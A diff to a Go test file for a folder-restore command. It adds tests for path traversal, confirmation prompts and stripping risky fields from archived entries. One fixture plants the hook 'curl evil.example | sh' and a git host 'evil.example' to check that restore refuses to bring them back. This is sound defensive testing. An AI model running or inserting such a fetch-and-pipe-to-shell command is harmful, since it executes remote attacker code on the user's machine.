@@ -46,7 +46,7 @@ func TestRestoreFolder_RoundTrip(t *testing.T) {
 	project, archive := archived(t)
 
 	var out bytes.Buffer
-	if err := RestoreFolder(&out, "old-service", RestoreOptions{}); err != nil {
+	if err := RestoreFolder(&out, "old-service", RestoreOptions{Yes: true}); err != nil {
 		t.Fatalf("RestoreFolder() error = %v", err)
 	}
 
@@ -94,6 +94,9 @@ func TestRestoreFolder_RefusesAConfiguredTarget(t *testing.T) {
 	if _, statErr := os.Stat(filepath.Join(archive, "old-service")); statErr != nil {
 		t.Errorf("the archived folder was moved: %v", statErr)
 	}
+	if folders := lazypath.GetConfig().Folders; len(folders) != 1 || folders[0].Path != project {
+		t.Errorf("config = %#v, want it unchanged", folders)
+	}
 }
 
 func TestRestoreFolder_RefusesALyingRecord(t *testing.T) {
@@ -102,6 +105,7 @@ func TestRestoreFolder_RefusesALyingRecord(t *testing.T) {
 		"empty":    "",
 		"relative": "relative/path",
 		"inside":   filepath.Join(archive, "elsewhere"),
+		"dotdot":   filepath.Join(archive, "..", filepath.Base(archive), "x"),
 	} {
 		t.Run(name, func(t *testing.T) {
 			dir := filepath.Join(archive, name)
@@ -191,5 +195,85 @@ func TestRestoreFolder_DryRun(t *testing.T) {
 	}
 	if folders := lazypath.GetConfig().Folders; len(folders) != 0 {
 		t.Errorf("config = %#v, want it unchanged", folders)
+	}
+}
+
+func TestRestoreFolder_RefusesAToInsideTheArchive(t *testing.T) {
+	_, archive := archivable(t)
+	if err := os.MkdirAll(filepath.Join(archive, "old"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	err := RestoreFolder(&bytes.Buffer{}, "old", RestoreOptions{To: filepath.Join(archive, "new")})
+	if err == nil || !strings.Contains(err.Error(), "inside the archive") {
+		t.Fatalf("error = %v, want a refusal", err)
+	}
+}
+
+func TestRestoreFolder_DoesNotRestoreWhatRuns(t *testing.T) {
+	project, archive := archivable(t)
+	dir := filepath.Join(archive, "old-service")
+	writeArchiveRecord(t, dir, ArchiveRecord{Original: project, ArchivedAt: time.Now(), Entry: &lazypath.Folder{
+		Path: project, Tags: []string{"work"}, Description: "kept", Name: "svc",
+		Hooks: &lazypath.Hooks{Enter: []string{"curl evil.example | sh"}},
+		Git:   &lazypath.GitConfig{Host: "evil.example", Group: "grp"},
+	}})
+	lazypath.SetTestConfig(lazypath.Config{})
+	if err := os.RemoveAll(project); err != nil {
+		t.Fatal(err)
+	}
+
+	for _, dry := range []bool{true, false} {
+		var out bytes.Buffer
+		if err := RestoreFolder(&out, "old-service", RestoreOptions{Yes: true, DryRun: dry}); err != nil {
+			t.Fatalf("RestoreFolder(dry=%v) error = %v", dry, err)
+		}
+		for _, want := range []string{"curl evil.example | sh", "evil.example", "not restored"} {
+			if !strings.Contains(out.String(), want) {
+				t.Errorf("dry=%v output = %q, want it to print %q", dry, out.String(), want)
+			}
+		}
+	}
+	got := configuredEntry(project)
+	if got == nil || got.Hooks != nil || got.Git != nil {
+		t.Fatalf("entry = %#v, want one without hooks or git", got)
+	}
+	if got.Name != "svc" || got.Description != "kept" || len(got.Tags) != 1 {
+		t.Errorf("entry = %#v, want the plain fields back", got)
+	}
+	if own := lazypath.OwnConfig().Folders; len(own) == 1 && (own[0].Hooks != nil || own[0].Git != nil) {
+		t.Errorf("own config = %#v, want no hooks or git", own)
+	}
+}
+
+func TestRestoreFolder_RecordTargetNeedsAnExistingParent(t *testing.T) {
+	_, archive := archivable(t)
+	missing := filepath.Join(t.TempDir(), "no", "such", "x")
+	writeArchiveRecord(t, filepath.Join(archive, "p"), ArchiveRecord{Original: missing})
+
+	err := RestoreFolder(&bytes.Buffer{}, "p", RestoreOptions{Yes: true})
+	if err == nil || !strings.Contains(err.Error(), "--to") {
+		t.Fatalf("error = %v, want a refusal hinting at --to", err)
+	}
+	if _, statErr := os.Stat(filepath.Join(t.TempDir(), "no")); statErr == nil {
+		t.Error("parents were created")
+	}
+	if _, statErr := os.Stat(filepath.Join(archive, "p")); statErr != nil {
+		t.Errorf("the folder was moved: %v", statErr)
+	}
+}
+
+func TestRestoreFolder_RecordTargetWithoutYesChangesNothing(t *testing.T) {
+	project, archive := archived(t)
+
+	// Not a terminal: nobody can answer, so nothing may change.
+	err := RestoreFolder(&bytes.Buffer{}, "old-service", RestoreOptions{In: strings.NewReader("y\n"), Err: &bytes.Buffer{}})
+	if err == nil || !strings.Contains(err.Error(), "--yes") {
+		t.Fatalf("error = %v, want a refusal naming --yes", err)
+	}
+	if _, statErr := os.Stat(project); !os.IsNotExist(statErr) {
+		t.Error("the project was restored")
+	}
+	if _, statErr := os.Stat(filepath.Join(archive, "old-service", RecordFile)); statErr != nil {
+		t.Errorf("the archive changed: %v", statErr)
 	}
 }
